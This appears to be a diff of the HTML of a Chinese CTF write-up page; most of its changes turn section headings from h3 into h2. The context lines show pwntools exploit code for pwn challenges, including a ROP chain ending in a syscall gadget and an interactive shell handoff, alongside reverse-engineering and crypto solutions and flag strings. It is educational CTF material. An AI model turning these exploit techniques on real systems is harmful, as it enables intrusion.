+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000496710</span><span class="p">)</span> <span class="c1"># add rax, 1 ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000402404</span><span class="p">)</span> <span class="c1"># syscall</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">taolve</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">taolve</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">taolve</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </span></span></code></pre></div><div class="anchor" id="pwn-funcanary"></div>
-<h3 class="relative group">pwn-funcanary 
+<h2 class="relative group">pwn-funcanary 
     <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
 <a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#pwn-funcanary" style="text-decoration-line: none !important;">#</a></span>
-</h3>
+</h2>
 <div class="highlight"><pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
 </span></span><span class="line"><span class="cl">
@@ -560,10 +689,10 @@
 </span></span><span class="line"><span class="cl">            <span class="n">pause</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl">            <span class="n">taolve</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </span></span></code></pre></div><div class="anchor" id="reverse-babyre"></div>
-<h3 class="relative group">reverse-babyre 
+<h2 class="relative group">reverse-babyre 
     <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
 <a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#reverse-babyre" style="text-decoration-line: none !important;">#</a></span>
-</h3>
+</h2>
 <p>先在网站打开题目发过来的xml项目，看到代码块，将代码块翻译成c++代码</p>
 <div class="highlight"><pre class="chroma" tabindex="0"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;iostream&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;vector&gt;</span><span class="cp">
@@ -630,10 +759,10 @@
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>运行脚本得到flag</p>
 <div class="anchor" id="crypto-基于国密sm2算法"></div>
-<h3 class="relative group">Crypto-基于国密SM2算法 
+<h2 class="relative group">Crypto-基于国密SM2算法 
     <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
 <a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#crypto-%e5%9f%ba%e4%ba%8e%e5%9b%bd%e5%af%86sm2%e7%ae%97%e6%b3%95" style="text-decoration-line: none !important;">#</a></span>
-</h3>
+</h2>
 <p>直接照着文档一步一步的走即可，用到了两个在线网站：</p>
 <p><a href="https://const.net.cn/tool/sm2/genkey/" target="_blank">
     https://const.net.cn/tool/sm2/genkey/</a></p>
@@ -696,10 +825,10 @@
 </span></span><span class="line"><span class="cl">  <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span><span class="n">pwner</span><span class="nd">@pwner</span><span class="o">-</span><span class="n">virtual</span><span class="o">-</span><span class="n">machine</span><span class="p">:</span><span class="o">~/</span><span class="n">CTF</span><span class="err">$</span> 
 </span></span></code></pre></div><div class="anchor" id="crypto-sign_in_passwd"></div>
-<h3 class="relative group">Crypto-Sign_in_passwd 
+<h2 class="relative group">Crypto-Sign_in_passwd 
     <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
 <a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#crypto-sign_in_passwd" style="text-decoration-line: none !important;">#</a></span>
-</h3>
+</h2>
 <p>flag文件里有两行字符串，</p>
 <p>j2rXjx8yjd=YRZWyTIuwRdbyQdbqR3R9iZmsScutj2iqj3/tidj1jd=D</p>
 <p>GHI3KLMNJOPQRSTUb%3DcdefghijklmnopWXYZ%2F12%2B406789VaqrstuvwxyzABCDEF5</p>
